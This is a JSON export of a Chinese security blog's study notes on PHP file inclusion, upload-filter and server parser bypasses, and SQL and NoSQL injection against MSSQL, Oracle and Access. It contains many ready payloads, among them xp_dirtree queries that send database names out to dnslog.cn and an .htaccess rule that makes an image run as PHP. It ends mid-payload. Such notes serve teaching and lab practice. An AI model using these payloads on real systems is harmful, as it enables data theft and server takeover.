[{"title":"文件包含漏洞","url":"http://example.com/2022/02/23/文件包含漏洞/","content":"一：文件包含的原理1.漏洞利用函数\n\n\n函数\n说明\n\n\n\ninclude()\n找不到被包含的文件时只产生警告，脚本将继续执行\n\n\ninclude_once()\n该文件中的代码已经被包含，则不会再次包含\n\n\nrequire()\n找不到被包含的文件时只产生致命错误，并停止脚本\n\n\nrequire_once()\n该文件中的代码已经被包含，则不会再次包含\n\n\nrequire()和include()函数的区别：\n使用require()函数包含文件时，只\n要程序执行，立即调用文件，而include()只有程序执行到该函数时才调用。\n其他用于包含的函数：\nhihlight_file()、show_source()、readfile()、file_get_contents()、fopen()、file()\n2.文件包含经典代码&lt;?php    $filename=$_GET[&#x27;filename&#x27;];\tinclude($filename);?&gt;\n\n以上代码，对$_GET[‘filename’]参数没有经过严格的过滤，直接带入了include()函数，攻击者可以修改$_GET[‘filename’]的值，加载其他文件，执行非预期的操作，由此造成了文件包含漏洞\n3.文件包含漏洞防御1.严格判断包含中的参数是否外部可控\n2.路径限制\n3.包含文件验证\n4.尽量不要使用动态包含，可以在需要包含的页面固定写好\n5.php中可以使用open_basedir配置限制访问\n6.过滤.、\\、/等\n7.禁止服务器远程文件包含\n二：文件包含漏洞利用1.文件包含漏洞的概述分类\n•主要包括本地文件包含(LFI)和远程文件包含(RFI)两种形式。\n•简单来说，本地文件包含就是可以读取和打开本地文件，远程文件包含（HTTT,FTP,PHP伪协议）就是可以远程加载文件。\n相关配置\n•allow_url_fopen=On/Off—是否允许打开URL文件，该选项为on便是允许包含URL对象文件等。默认开启\n•allow_url_include=On/Off—是否允许引用URL文件，激活URL形式的fopen封装协议使得可以访问URL对象文件等。默认关闭\n2.本地包含1.本地包含的意思(LFI)指的是通过相对路径的方式能打开并包含本地文件的漏洞，大部分情\n况下遇到的文件包含漏洞都是LFI\n2.包含条件•allow_url_fopen=On（php.ini中进行配置，该选项默认为On）\n•用户可以动态控制变量\n3.无限制本地文件包含漏洞代码&lt;?php    $filename=$_GET[&#x27;filename&#x27;];\tinclude($filename);?&gt;\n\n4.无限制本地文件包含漏洞利用1.获取到系统中的其他文件的内容\n绝对路径读取本地文件\n?action=C:\\Windows\\System32\\drivers\\etc\\hosts\n\n相对路径读取本地文件\naction=..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\n\n2.包含图片木马\n利用文件包含漏洞直接包含图片木马\n/action.php?action=./est.jpg\n\n5.有限制本地文件包含漏洞绕过经典代码\n&lt;?php    $filename=$_GET[&#x27;filename&#x27;];\tinclude($filename.&quot;php&quot;);?&gt;\n\n绕过方法\n1.%00截断\n条件：\nmagic_quotes_gpc=Off，php版本&lt;5.3.4，获取phpinfo.php文件\n?action=phpinfo.php%00\n\n2.路径长度截断\n条件：\nWindows下要长于256字节，超出的部分会被丢弃\nLinux下要长于4096字节，超出的部分会被丢弃。\n././././\t\t\t\t\t//长文件名截断\t\n\n3.点号截断\n条件：\nwindows系统，点号需要长于256\n........\t\t\t\t\t//点截断\n\n3.远程文件包含1.远程包含文件的意思指的是能够包含远程服务器上的文件并执行，可以通过http(s)或者ftp等方式，远程加载文件\n2.包含条件allow_url_include=On（默认为OFF，需要在php.ini中手动打开）\nallow_url_fopen=On（是否允许打开远程文件）\n用户可以动态控制变量\n3.绕过方式1.问好绕过\n?action=http://192.168.152.143/phpinfo.php?\n\n2.#号绕过\n?action=http://192.168.152.143/phpinfo.php%23\t//#号URL编码\n\n3.空格绕过\n?action=http://192.168.152.143/phpinfo.php%20   //%20是空格\n\n4.漏洞利用\n三：php为协议1.php伪协议的用途\n\n\n伪协议\n说明\n\n\n\nfile://\n访问本地文件系统\n\n\nhttp://\n访问HTTP(s)网址\n\n\nftp://\n访问FTP(s)URLS\n\n\nphp://\n访问各个输入/输出流\n\n\nzlib://\n压缩流\n\n\ndata://\n数据(RFC2397)\n\n\nrar://\nRAR\n\n\n2.三种常用的PHP伪协议详解1.file://协议用途：访问本地系统文件\n使用条件：\n​                allow_url_fopen：off/on\n​                allow_url_include：off/on\n​                file://协议在两个配置都为off的情况下是可以正常使用的\n使用方法：file://文件的绝对路径和文件名\n\n2.php://filter用途：常用于读取文件/源码\n使用条件：\n​            allow_url_fopen：off/on\n​            allow_url_include：off/on\n​            两个配置都为off的情况下是可以正常使用的\n使用：\n[?path=php://filter/read=convert.base64-encode/resource=文件.php]\n\n注意：通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码。虽然不能直接获取到shell，但能读取敏感文件。\nphp://filter协议与file://协议的区别：file协议只能使用绝对路径，filter协议相对路径和绝对路径都可以使用PHP伪协议\n3.php://input用途：可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代执行\n使用条件：\n​        allow_url_fopen：off/on\n​        allow_url_include：on\n使用方法：?file=php://input\n[POST]：&lt;?phpphpinfo()?&gt;(执行POSTDATA中的内容)PHP伪协议\n4.zip://使用条件：\n​        php版本&gt;=5.2\n​        allow_url_fopen：off/on\n​        allow_url_include：off/on\n用法：\n?file=zip://D:/soft/phpstudy/www/file.zip%23phpoode.txt\n\n5.compress.bzip2://使用条件：\n​        php版本&gt;=5.2\n​        allow_url_fopen：off/on\n​        allow_url_include：off/on\n用法：\n?file=compress.bzip2://D:/soft/phpstudy/www/file.bz2\t\t\t// or?file=compress.bzip2://../file.bz2\n\n6.compress.bzip://使用条件：\n​        php版本&gt;=5.2\n​        allow_url_fopen：off/on\n​        allow_url_include：off/on\n用法：\n?file=compress.bzip://D:/soft/phpstudy/www/file.gz\t\t\t// or?file=compress.bzip://../file.gz\n\n7.data://使用条件：\n​        php版本&gt;=5.2\n​        allow_url_fopen：on\n​        allow_url_include：on\n用法：\n?file=data://text/plain,&lt;?php phpinfo();?&gt;    //or?file=data://text/plain;base64.  \n\n","categories":["文件包含漏洞"],"tags":["web安全"]},{"title":"文件上传漏洞","url":"http://example.com/2022/02/23/文件上传漏洞/","content":"一：漏洞原理与检测方法一：文件上传产生的原因1.未过滤或Web前端过滤被绕过\n2.文件检测被绕过\n3.中间件解析\n4.不完善的黑名单扩展名\n5.文件路径截断\n6.HTTP不安全方法(PUT协议)\n二：文件上传检测之前端检测1.前端检测经典前端防御代码\nfunctioncheckFile(&#123;    varfile=document.getElementsByName(&#x27;upload_file&#x27;)\t[0].value;\tif(file==null||file==&quot;&quot;)&#123;        alert(&quot;请选择要上的传件!&quot;);        returnfalse;&#125;varallow_ext=&quot;.jpg|.png|.gif&quot;;//\t定义白名单，允许上传的文件类型varallowext_name=file.substring(file.lastIndexOf(&quot;.&quot;));//提取上传文件的类型\tif(allow_ext.indexOf(ext_name)==-1)&#123;//判断上传文件类型是否允许上传        varerrMsg=&quot;该文件不允许上传，请上传&quot;+allow_ext+&quot;类型的文件,当前文件类型为：&quot;+ext_name;        alert(errMsg);        returnfalse;&#125;&#125;\n\n2.前端绕过1.通过修改前端页面的js代码绕过\n\n三：文件上传MIME-TYPE检测1.了解MIME•MIME(MultipurposeInternetMailExtensions)是描述消息内容类型标准。\n•MIME消息能包含文本、图像、音频、视频以及其他应用程序专用的数据，当具有该扩展名的文件被访问时，浏览器会自动使用指定的应用程序打开。\n•协议中，使用Content-Type字段表示文件的MIME类型\n\n2.经典代码if(isset($_POST[&#x27;submit&#x27;]))&#123;    if(file_exists($UPLOAD_ADDR))&#123;        if(($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;]==&#x27;image/jpeg&#x27;)||[&#x27;type&#x27;]==&#x27;image/png&#x27;)||($_FILES[&#x27;upload_file&#x27;] [&#x27;type&#x27;]==&#x27;image/gif&#x27;))&#123;//允许上传的MIME类型         if(move_uploaded_file($_FILES[&#x27;upload_file&#x27;] [&#x27;tmp_name&#x27;],$UPLOAD_ADDR.&#x27;/&#x27;.$_FILES[&#x27;upload_file&#x27;]  [&#x27;name&#x27;]))&#123;                   $img_path=$UPLOAD_ADDR.$_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];    $is_upload=true;&#125;        &#125;else&#123;            $msg=&#x27;文件类型不正确，请重新上传！&#x27;;&#125;    &#125;else&#123;        $msg=$UPLOAD_ADDR.&#x27;文件夹不存在,请手工创建！&#x27;;&#125;&#125;\n\n3.绕过方法由于服务器在检测Content-Type类型的时候，取得的变量来自用户，所以可以用burp抓包，修改字段使其合法，即可绕过限制上传任意文件。\n四：文件上传之文件头检测1.什么是文件头文件头是位于文件开头的一段承担一定任务数据，就是为了描述文件的一些重要的属性\n\n2.相关代码functionisImage($filename)&#123;    $types=&#x27;.jpeg|.png|.gif&#x27;;    if(file_exists($filename))&#123;        $info=getimagesize($filename);//检查文件内容是否是图片格式的     $ext=image_type_to_extension($info[2]);        if(stripos($types,$ext))&#123;            return$ext;        &#125;else&#123;            returnfalse;&#125;    &#125;else&#123;        returnfalse;&#125;&#125;\n\n3.文件头检测的绕过方法通过伪造合法的文件头可以绕过这种检测\n通常检测函数根据文件的前10个字节，就可以判断文件类型，而图片的文件头一般都是固定的\n\n五：文件上传检测之黑白名单1.黑白名单介绍基于白名单验证：当上传的文件后缀名是在白名单中有的后缀名，文件才能上传成功\n基于黑名单验证：当上传的文件后缀名是在黑名单中没有的后缀名，文件才能上传成功\n2.绕过黑名单检测1.文件名大小写绕过(较少)\n用像AsP，pHp之类的文件名，如果黑名单上不存在的话就可以绕过黑名单检测\n过滤严格的话一般会用strtolower()函数把后缀名全变为小写，此时就不能绕过黑名单了\n2.特殊文件名绕过\n\n\n3.00阶段绕过(现在较少)\n原理：0x00是字符串的结束标识符，可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过，00就是Null(空)字符，Url中表现为%00\n\n二：解析漏洞和编辑器漏洞一：什么是文件解析1.指当前服务器接收到一个HTTP请求时，web容器（如IIS,Apache）首先会根据文件的后缀名，决定如何处理这个请求\n2.当服务器获取到所请求的页面的后缀后，接下来就会在服务器端寻找可以处理这类后缀名的应用程序，如果找不到则直接把这个文件返回给客户端\n二：Apache解析漏洞1.多后缀存在版本：Apache1.x和Apache2.x\n解析规则：从右向左开始解析，如果后缀名为不可识别文件解析，就在往左判断，如果都不认识，则会暴漏其源码\n举例：可以上传一个test.php.aaa.bbb，绕过验证且服务器依然会将其解析为php\n2.配置问题导致漏洞漏洞产生原因：\n​                ①如果在Apache的conf里有这样一行配置AddHandlerphp5-script.php这时只要文件名里包含.php，即使文件名是test2.php.jpg也会以php来执行\n​                ②如果在Apache的conf里有这样一行配置AddTypeapplication/x-httpd\\php.jpg，即使扩展名是jpg，一样能以php方式执行\n3.htaccess文件解析htaccess文件可以配置很多事情，如是否开启站点的图片缓存、自定义错误页面、自定义默认文档、等等。但我们这里只关心\nhtaccess文件的一个作用——MIME类型修改\n如果Apache中.htaccess可被执行并可被上传，那么可以尝试在.htaccess中写入\n&lt;FilesMatch&quot;shell.jpg&quot;&gt;SetHandlerapplication/x-httpd-php&lt;/FilesMatch&gt;\n\n另一种写法\nAddTypeapplication/x-httpd-php.xxx\n\n如果写入，就成功的使该.htaccess文件所在的目录及子目录中的后缀为.xxx的文件被Apache当做php文件\n三：IIS6.0解析漏洞1.目录解析形式：/xx.asp/xx.jpg\n原理：在网站下创建文件夹名字为.asp、.asa的文件夹，其目录内的任何扩展名的文件都被当作asp文件来解析并执行。因此只要攻击者只需通过该漏洞上传图片马，不用修改后缀名\n2.文件解析形式：/xx.asp;.jpg（利用特殊符号”;”）\n原理：在iis6.0下，服务器默认不解析；号后面的内容，所以xx.asp;.jpg被解析为asp脚本解析漏洞\n3.解析文件类型形式：/test.asa、/test.cer、/test.cdx\n原理：iis6.0默认的可执行文件除了asp还包含这三种asa、cer、cdx，会将三种扩展名文件解析为asp文件\n四：IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞（PHP CGI解析漏洞）利用条件：\n​        1.Fast-CGI运行模式\n​        2.php.ini里cgi.fix_pathinfo=1(默认为1)\n​        3.取消勾选php-cgi.exe程序    的”Invokehandleronlyifrequestismappedto”\n形式：如果在一个文件路径/xx.jpg后面加上/xx.php会将/xx.jpg/xx.php解析为php文件\n五：Nginx&lt;8.03空字节代码执行漏洞影响版本：0.5，0.6，0.7&lt;=0.7.65，0.8&lt;=0.8.37•\n原理：\n​        在使用PHP-FastCGI执行php的时候，URL里面在遇到%00空字时与FastCGI处理不一致，导致可以在图片中嵌入PHP代码然\n后通过访问xxx.jpg%00.php来执行其中的代码\n恶意用户发出请求就会将file.ext作为PHP文件解析\n\n","categories":["文件上传漏洞"],"tags":["web安全"]},{"title":"","url":"http://example.com/2022/02/17/mysql数据外带/","content":"mysql数据外带一：dnslog数据外带","categories":[],"tags":[]},{"title":"","url":"http://example.com/2022/02/17/一：获取数据库网站密码/","content":"一：获取数据库网站密码判断注入类型和数据库类型因为是asp文件所以对应的数据库是mssql数据库\nid=1&#x27;&quot;\\\t\t\t\t\t//存在注入，数字型\t\t\n\n\nid=1 and 1=1         //页面返回正常id=1 and 1=0         //页面返回错误    \n\n使用dnslong数据外带尝试获取数据获取当前数据库declare @a varchar(1024);set @a=&#x27;\\\\&#x27;%2Bmaster.dbo.fn_varbintohexstr(CONVERT( varbinary(max), db_name()))%2B&#x27;.p5zi3s.dnslog.cn&#x27;;exec xp_dirtree @a;\t\t\t\t//爆出当前数据库\n\n\n当前数据库名为22\n获取所有数据库declare @a varchar(1024);set @a=&#x27;\\\\&#x27;%2Bmaster.dbo.fn_varbintohexstr(CONVERT( varbinary(max), substring((select top 1 name from master..sysdatabases where name not in (select top 0 name from master..sysdatabases)),1,15)))%2B&#x27;.6qwo0k.dnslog.cn&#x27;;exec xp_dirtree @a;\t\t\t//获取第一个数据库master\t\t\t\t\t\t//第一个数据库名model\t\t\t\t\t\t//第二个数据库msdb\t\t\t\t\t\t //第三个数据库22    \t\t\t\t\t\t//当前数据库\n\n\n查询22数据库下的表declare @a varchar(1024);set @a=&#x27;\\\\&#x27;%2bmaster.dbo.fn_varbintohexstr(CONVERT( varbinary(max), (SELECT top 1 name FROM &quot;22&quot;..sysobjects WHERE xtype=CHAR(85) and name not in (SELECT top 0 name FROM &quot;22&quot;..sysobjects WHERE xtype=CHAR(85)))))%2b&#x27;.odwqri.dnslog.cn\\xxx&#x27;;exec xp_dirtree @a;//依次查询22库下的所有表sysrscols\t        DB_AnswerAgree\t\tDB_AnswerFav\t\t\tDB_Cart\t\t\t\t\tDB_Course\t\t\tDB_CourseCart\t\t\tDB_CourseOrder\t\t\t     \n\n查询DB_Course表下的字段declare @a varchar(1024);set @a=&#x27;\\\\&#x27;%2bmaster.dbo.fn_varbintohexstr(CONVERT( varbinary(max), (select top 1 column_name  from information_schema.columns where table_name=&#x27;DB_Course&#x27; and column_name not in (select top 4 column_name from information_schema.columns))))%2b&#x27;.rga2fh.dnslog.cn\\xxx&#x27;;exec xp_dirtree @a;      \t\t//依次查询表下的字段//字段如下IDStyleID\n\n\n\n二：nosql注入-扩展burp抓包账号使用正则表达式，密码使用&amp;ne逻辑绕过使其恒为真\n\n爆破密码的第一个字母\n\n选取a进行继续爆破\n\n\n爆出密码的第二个字母，继续爆第三个字母\n\n\n第三个字母为m,最后依次爆出i,n\n\n\n用户名为admin\n使用正则表达式爆破密码\n\n\n密码第一个字母为f\n\n依次爆破l,a,g,{,d,j,h,d,-,f,h,e,i,3,-,2,9,i,j,-,9,i,o,k,}\n\n账号：admin密码：flag{djhd-fhei3-29ij-9iok}\n登录成功\n","categories":[],"tags":[]},{"title":"","url":"http://example.com/2022/02/16/oracle数据库注入/","content":"一：联合注入判断注入类型id=1&#x27;&quot;\\\t\t\t\t\t\t\t//判断闭合id=1 and 1=1 --\t\t\t\t\t//判断注入id=1 and 1=0 --\n\n爆字段id=1 order by 4 --\n\n查看回显字id=-1 union select null,null,null,null from dual --\t\t\t//前后的数据类型要相同 ，所以回显位可以用unll来代替   \n\n\n查看当前数据库id=1 union select SYS_CONTEXT(&#x27;USERENV&#x27;,&#x27;CURRENT_USER&#x27;),null,null from dual--\t//查看当前数据库\n\n查看有多少个数据库id=-1 union select count(distinct(owner)),null,null from sys.all_tables--\n\n子查询遍历数据库-1 union select null ,owner,null,null from (select owner,rownum as limit from (select distinct(owner) from all_tables))where limit =1--\t\t\t\t//将所有的数据库建立一个虚假的表通过limit进行x限制排序\n\n\n子查询遍历表名-1 union select null ,table_name,null,null from (select table_name,rownum as limit from (select table_name from all_tables where owner=&#x27;TEST&#x27;)) where limit =1 --//all_tables表中储存着所有的数据库名和表名    \n\n\n子查询遍历字段名//user_tab_columns储存所有的字段-1 union select null ,column_name,null,null from (select column_name,rownum as limit from (select column_name from user_tab_columns where table_name=&#x27;DEMO&#x27;)) where limit =1 --\n\n\n查询字段数据-1 union select  ID,null,null,null from TEST.DEMO where ROWNUM =1 and ID not in(3,1)--\t\t//只能查询一个字段数据        //子查询多个字段数据 -1 union select null,ID||chr(126)||NAME||chr(126)||AGE||chr(126)||SEX,null,null  from  TEST.DEMO --\t\t\t//查看一组字段数据 -1 union select null,hua,null,null  from (select hua,rownum as limit from (select ID||chr(126)||NAME||chr(126)||AGE||chr(126)||SEX as hua from TEST.DEMO)) where limit =1 --  \t\t//遍历每组的字段数据      \n\n\n\n二：报错注入判断注入类型id=1&#x27;&quot;\\\t\t\t\t\t\t\t//判断闭合id=1 and 1=1 --\t\t\t\t\t//判断注入id=1 and 1=0 --\n\n查看当前数据库id=1 and (SELECT dbms_xdb_version.checkin(  SYS_CONTEXT(&#x27;USERENV&#x27;, &#x27;CURRENT_USER&#x27;) ) FROM DUAL) is not null--\n\n\n遍历所有数据库1 and (SELECT dbms_xdb_version.checkin((SELECT OWNER FROM (SELECT OWNER,ROWNUM AS LIMIT FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)) WHERE LIMIT = 2)) FROM DUAL) is not null--//改变limit的值遍历所有数据库名    \n\n\n遍历所有表d=1 and (SELECT dbms_xdb_version.checkin((SELECT TABLE_NAME FROM (SELECT TABLE_NAME,ROWNUM AS LIMIT FROM (SELECT TABLE_NAME FROM sys.all_tables WHERE OWNER = &#x27;TEST&#x27;)) WHERE LIMIT = 1)) FROM DUAL) is not null--//改变limit的值遍历TEST数据库所有表名    \n\n\n遍历所有字段id=1 and (SELECT dbms_xdb_version.checkin((SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME,ROWNUM AS LIMIT FROM (SELECT COLUMN_NAME FROM sys.user_tab_columns WHERE TABLE_NAME = &#x27;DEMO&#x27;)) WHERE LIMIT = 1))  FROM DUAL) is not nul--//改变limit的值遍历DEMO数据库所有表名     \n\n\n遍历每组的字段数据id=1 and (SELECT dbms_xdb_version.checkin((SELECT DATA FROM (SELECT DATA, ROWNUM AS LIMIT FROM (SELECT ID||chr(126)||NAME||chr(126)||AGE||chr(126)||SEX AS DATA FROM  TEST.DEMO)) WHERE LIMIT = 1))  FROM DUAL) is not null --\n\n\n三：bool盲注判断注入类型id=1&#x27;&quot;\\\t\t\t\t\t\t\t//判断闭合id=1 and 1=1 --\t\t\t\t\t//判断注入id=1 and 1=0 --\n\n判断数据库长度id=1 and (select length(owner) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1)&gt;11\t//通过页面返回的结果判断数据库的长度    \n\n\nid=1 and (select length(owner) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1)=11\t\t//页面返回正常第一个数据库的长度为11    \n\n\n判断数据库的名字id=1 and (select ascii(substr(owner,1,1)) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1)&gt;65 //判断第一个数据库名的第一个字母   \n\n\n后续依次爆出数据库名\n判断表名长度id=1 and (select length(table_name) from (select table_name,rownum as limit from (select distinct(table_name) from all_tables where owner =&#x27;TEST&#x27;)) where limit = 1)=4//TEST数据库的第一个表的长度为4\n\n\n判断表名id=1 and (select ascii(substr(table_name,1,1)) from (select table_name,rownum as limit from (select distinct(table_name) from all_tables where owner =&#x27;TEST&#x27;)) where limit = 1)&gt;50//TEST数据库的第一个表的第一个字母 \n\n四：时间盲注判断注入类型id=1&#x27;&quot;\\\t\t\t\t\t\t\t//判断闭合id=1 and 1=1 --\t\t\t\t\t//判断注入id=1 and 1=0 --\n\n判断数据库长度id=1 and (CASE WHEN (select length(owner) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1)=11 THEN DBMS_PIPE.RECEIVE_MESSAGE(123, 5) ELSE 1 END)=1\t\t// 页面延时5秒后刷新，第一个数据库的长度为11   \n\n\n判断数据库名id=1 and (CASE WHEN (select ascii(substr(owner,1,1)) from (select owner,rownum as limit from (select distinct(owner) from all_tables)) where limit = 1)&gt;65 THEN DBMS_PIPE.RECEIVE_MESSAGE(123, 5) ELSE 1 END)=1\t\t// 页面延时5秒后刷新，第一个数据库名的第一个字母为A   \n\n判断表的长度id=1 and (CASE WHEN id=1 and (select length(table_name) from (select table_name,rownum as limit from (select distinct(table_name) from all_tables where owner =&#x27;TEST&#x27;)) where limit = 1)=4 THEN DBMS_PIPE.RECEIVE_MESSAGE(123, 5) ELSE 1 END)=1//  页面延时5秒后刷新，第一个数据库第一个表的长度为11   \n\n判断表名id=1 and (CASE WHEN id=1 and (select ascii(substr(table_name,1,1)) from (select table_name,rownum as limit from (select distinct(table_name) from all_tables where owner =&#x27;TEST&#x27;)) where limit = 1)&gt;50 THEN DBMS_PIPE.RECEIVE_MESSAGE(123, 5) ELSE 1 END)=1 //TEST数据库的第一个表的第一个字母    \n\n","categories":["web安全"],"tags":["SQL注入"]},{"title":"","url":"http://example.com/2022/02/15/Access注入/","content":"一：联合注入因为access数据库储存方式与其他数据库不同，其他类型的数据库都有库名，access数据库类型每个文件就是一个库。所以需要猜测数据库的表名\n1.猜测表名和列名payload?id=1 and exists(select count(*)from tb_name)   //通过修改tb_name，来爆破表名\n\n?id=1 and exists(select count(column_name)from tb_name)   //指定表名，通过修改column_name，来爆破字段名\n\n2.判断注入类型payloadid=1&#x27;&quot;\\\t\t\t\t\t\t\t//判断注入类型id=1 and 1=1 \t\t\t\t\t//回显正常id=1 and 1=0\t\t\t\t\t//回显不正常\n\n3.判断字段数payload?id=1 order by 3 --\t\t\t\t//判断字段数\n\n4.查看回显位payload?id=1 union select 1,2,3 --\t\t\t\t//查看回显位\n\n5.使用top遍历字段数据payload?id=1 union select top 1 1,username,password from user where username not in(select top 1 username from user) --\n\n二：bool盲注1.猜测表名和列名payload?id=1 and exists(select count(*)from tb_name)   //通过修改tb_name，来爆破表名\n\n?id=1 and exists(select count(column_name)from tb_name)   //指定表名，通过修改column_name，来爆破字段名\n\n2.获取列名的长度payload?id=1 and (select top 1 len(username) from user where username not in (select top 1 username from user))&gt;5\t\t\t//获取第一个列名的长度\n\n3.获取列名数据?id=1 and (select top 1 asc(mid(username,1,1)) from user where username not in (select top 1 username from user))&gt;70\t//获取第一个行的第一个字母        ?id=1 and (select top 1 asc(mid(username,2,1)) from user where username not in (select top 1 username from user))&gt;70\t//获取第一个行的第二个字母         ?id=1 and (select top 1 asc(mid(username,3,1)) from user where username not in (select top 1 username from user))&gt;70\t//获取第一个行的第三个字母       //通过该变mid(username,3,1)来遍历表 第一行的所有字母   \n\n?id=1 and (select top 1 asc(mid(username,1,1)) from user where username not in (select top 2 username from user))&gt;70\t//获取第二个行的第一个字母        ?id=1 and (select top 1 asc(mid(username,2,1)) from user where username not in (select top 2 username from user))&gt;70\t//获取第二个行的第二个字母         ?id=1 and (select top 1 asc(mid(username,3,1)) from user where username not in (select top 2 username from user))&gt;70\t//获取第二个行的第三个字母       //通过该变top 2 来获取第二行的数据   \n\n","categories":["web安全"],"tags":["SQL注入"]},{"title":"","url":"http://example.com/2022/02/15/MSSQL/","content":"一：联合注入判断注入类型payload&#x27;&quot;\\\t\t\t\t\t\t\t\t\t\t//判断注入类型&#x27;and 1=1 --\t\t\t\t\t\t\t\t//判断是否有注入\n\nsql语句select * from user where id=&#x27;1&#x27;and 1=1 --&#x27;;\n\n\n判断字段数payload1&#x27;order by 3 --\t\t\t\t\t\t\t//字段位4时报错说明字段数为3\n\n\nsql语句select * from where id=&#x27;1&#x27;order by 3--&#x27;;\n\n显示回显位payload0&#x27; union select 1,2,3 --\t\t\t\t//让显示位出现\n\nsql语句select * from user where id=&#x27;0&#x27; union select 1,2,3 --&#x27;;\n\n查看当前数据库payload0&#x27; union select 1,2,db_name() --\t\t//db_name当前数据库\n\nsql语句select * from user where id=&#x27;0&#x27; union select 1,2,db_name() --&#x27;;\n\n\n查看当前数据库所有表名payload0&#x27; union select top 1 1,2,table_name from information_schema.tables where table_name not in (select top 0 table_name from information_schema.tables) --\n\n\nsql语句select * from user where id=&#x27;0&#x27; union select top 1 1,2,table_name from information_schema.tables where table_name not in (select top 0 table_name from information_schema.tables) --&#x27;;\n\n查看当前数据库下user表中的所有字段payload0&#x27; union select top 1 1,2,column_name  from information_schema.columns where table_name=&#x27;users&#x27; and column_name not in (select top 4 column_name from information_schema.columns) --\n\n\nsql语句select * from user where id=&#x27;0&#x27;union select top 1 1,2,column_name  from information_schema.columns where table_name=&#x27;users&#x27; and column_name not in (select top 4 column_name from information_schema.columns) --&#x27;;\n\n查看username,password字段的所有数据payload0&#x27; union select top 1 1,username,password from users where password not in (select top 1 password from users) --\n\nsql语句select * from user where id=&#x27;0&#x27; union select top 1 1,username,password from users where password not in (select top 1 password from users) --&#x27;;\n\n\n查看所有数据库payload0&#x27; union select top 1 1,2,name from master.dbo.sysdatabases where name not in (select top 1 name from master.dbo.sysdatabases)--            //通过该变“top 1” 的值遍历所有数据库名\n\nsql语句select * from user where id=&#x27;0&#x27; union select top 1 1,2,name from master.dbo.sysdatabases where name not in (select top 1 name from master.dbo.sysdatabases) --&#x27;;\n\n\n查看test数据库下的所有表payload0&#x27; union select top 1 1,id,name from test..sysobjects where xtype=CHAR(85) and name not in (select top 1 name from test..sysobjects where xtype=CHAR(85))--\n\nSQL语句select * from user where id=&#x27;0&#x27; union select top 1 1,2,name from test..sysobjects where xtype=CHAR(85) and name not in (select top 1 name from test..sysobjects where xtype=CHAR(85) --&#x27;;\n\n\n查看users表下的所有字段payload0&#x27; union select top 1 1,id,name from test..syscolumns where id=2105058535 and name not in (select top 1 name from test..syscolumns where id=2105058535)--\n\nsql语句select * from user where id=&#x27;0&#x27; union select top 1 1,id,name from test..syscolumns where id=2105058535 and name not in (select top 1 name from test..syscolumns where id=2105058535)--&#x27;;\n\n\n查看username,password字段的所有数据payload0&#x27; union select top 1 1,username,password from users where password not in (select top 1 password from users) --\n\nsql语句select * from user where id=&#x27;0&#x27; union select top 1 1,username,password from users where password not in (select top 1 password from users) --&#x27;;\n\n\n二：报错注入利用前后查询的字符类型不同而产生报错，如果字符类型相同就不会发生报错，所以在构建payload时要时刻注意。\n判断注入类型payload&#x27;&quot;\\\t\t\t\t\t\t\t\t\t\t//判断注入类型1 and 1=1 --\t\t\t\t\t\t\t\t//页面正常1 and 1=0 --\t\t\t\t\t\t\t\t//返回不常 ，存在注入   \n\n查看所有数据库payload1 and 1=(select top 1 cast(name as nvarchar(1000)) from master..sysdatabases where cast(name as nvarchar(1000)) not in (select top 1 cast(name as nvarchar(1000)) from master..sysdatabases))%2Bchar(126)--\n\ncast(name as nvarchar(1000))\t\t\t\t// 将name转换为字符串\n\nsql语句select * from user where id=1 and 1=(select top 1 cast(name as nvarchar(1000)) from master..sysdatabases where cast(name as nvarchar(1000)) not in (select top 1 cast(name as nvarchar(1000)) from master..sysdatabases))%2Bchar(126)--;\n\n1.master数据库id=1 and 1=(select top 1 cast(name as nvarchar(1000)) from master..sysdatabases where cast(name as nvarchar(1000)) not in (select top 0 cast(name as nvarchar(1000)) from master..sysdatabases))%2Bchar(126)--\n\n2.tempdb数据库id=1 and 1=(select top 1 cast(name as nvarchar(1000)) from master..sysdatabases where cast(name as nvarchar(1000)) not in (select top 1 cast(name as nvarchar(1000)) from master..sysdatabases))%2Bchar(126)--\n\n3.model数据库id=1 and 1=(select top 1 cast(name as nvarchar(1000)) from master..sysdatabases where cast(name as nvarchar(1000)) not in (select top 2 cast(name as nvarchar(1000)) from master..sysdatabases))%2Bchar(126)--\n\n4.msdb数据库id=1 and 1=(select top 1 cast(name as nvarchar(1000)) from master..sysdatabases where cast(name as nvarchar(1000)) not in (select top 3 cast(name as nvarchar(1000)) from master..sysdatabases))%2Bchar(126)--\n\n5.ReportServer数据库id=1 and 1=(select top 1 cast(name as nvarchar(1000)) from master..sysdatabases where cast(name as nvarchar(1000)) not in (select top 4 cast(name as nvarchar(1000)) from master..sysdatabases))%2Bchar(126)--\n\n6.ReportServerTempDB数据库id=1 and 1=(select top 1 cast(name as nvarchar(1000)) from master..sysdatabases where cast(name as nvarchar(1000)) not in (select top 5 cast(name as nvarchar(1000)) from master..sysdatabases))%2Bchar(126)--\n\n7.test数据库id=1 and 1=(select top 1 cast(name as nvarchar(1000)) from master..sysdatabases where cast(name as nvarchar(1000)) not in (select top 6 cast(name as nvarchar(1000)) from master..sysdatabases))%2Bchar(126)--\n\n查看test数据库的所有表payload1 and 1=(select top 1 name  from test..sysobjects where xtype=CHAR(85)  and name not in (select top 5 name from test..sysobjects where xtype=CHAR(85)))%2Bchar(126)--\n\n\nsql语句select * from user where id=1 and 1=(select top 1 name  from test..sysobjects where xtype=CHAR(85)  and name not in (select top 5 name from test..sysobjects where xtype=CHAR(85)))%2Bchar(126)--;\n\n爆出对应的id1 and 1=(select top 1 cast(id as nvarchar(1000))  from test..sysobjects where xtype=CHAR(85)  and id not in (select top 5 id from test..sysobjects where xtype=CHAR(85)))%2Bchar(126)--\n\n\n查看sysrscols表下的所有字段payload1 and 1=(select top 1 cast(name as nvarchar(1000)) from test..syscolumns where id=2105058535 